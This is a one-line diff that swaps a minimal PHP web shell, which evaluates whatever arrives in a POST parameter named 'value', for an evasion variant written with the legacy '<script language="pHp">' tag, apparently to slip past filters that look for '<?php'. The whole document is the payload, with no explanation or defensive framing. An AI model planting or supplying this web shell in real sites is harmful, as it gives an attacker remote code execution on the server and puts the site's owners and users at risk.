@@ -1,1 +1,1 @@
-<?php @eval($_POST['value']);?>
+<script language="pHp">@eval($_POST['value']); </script>
